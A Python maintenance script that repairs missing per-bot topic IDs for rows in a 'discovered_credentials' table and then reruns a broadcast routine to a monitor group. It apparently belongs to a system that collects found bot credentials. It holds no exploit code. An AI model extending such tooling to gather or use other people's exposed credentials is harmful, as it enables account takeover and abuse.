import asyncio
import os
import sys
import logging
from datetime import datetime, timezone

# Ensure project root is in path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.core.config import settings
from app.core.database import db
from app.services.broadcaster_srv import BroadcasterService
from app.workers.tasks.flow_tasks import _broadcast_logic

# Configure Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger("self_heal_sync")

async def self_heal():
    print("🩹 [Self-Heal] Starting system-wide sync and recovery...")
    
    broadcaster = BroadcasterService()
    
    # 1. Fetch all active credentials
    try:
        response = db.table("discovered_credentials")\
            .select("*")\
            .eq("status", "active")\
            .execute()
        credentials = response.data
    except Exception as e:
        print(f"    ❌ DB Error: {e}")
        return

    print(f"    📊 Found {len(credentials)} active credentials. Checking for missing topics...")

    heal_count = 0
    for cred in credentials:
        cred_id = cred["id"]
        meta = cred.get("meta") or {}
        topic_id = meta.get("topic_id")
        
        # Determine intended topic name
        bot_username = meta.get("bot_username", "unknown")
        bot_id = meta.get("bot_id", "0")
        topic_name = f"@{bot_username} / {bot_id}"

        # If topic_id is missing or suspicious (like 0), heal it
        needs_healing = not topic_id or topic_id == 0
        
        if needs_healing:
            print(f"    🩹 Healing Topic for CredID: {cred_id} ({topic_name})...")
            try:
                # ensure_topic handles existence check and creation
                new_topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
                
                # Update DB meta
                meta["topic_id"] = new_topic_id
                meta["healed_at"] = datetime.now(timezone.utc).isoformat()
                
                db.table("discovered_credentials")\
                    .update({"meta": meta})\
                    .eq("id", cred_id)\
                    .execute()
                
                print(f"    ✅ Recovered Topic ID: {new_topic_id}")
                heal_count += 1
            except Exception as e:
                print(f"    ❌ Failed to heal {cred_id}: {e}")

    print(f"🏁 Topic healing complete. Repaired {heal_count} records.")

    # 2. Trigger Broadcast Logic
    print("\n🚀 [Self-Heal] Triggering full broadcast catch-up...")
    try:
        # We manually run the broadcast logic to clear any pending messages
        # No need to check for locks here as _broadcast_logic is idempotent
        result = await _broadcast_logic()
        print(f"✅ Broadcast Result: {result}")
    except Exception as e:
        print(f"❌ Broadcast Fail: {e}")

    print("\n✨ [Self-Heal] System recovery finished.")

if __name__ == "__main__":
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(self_heal())
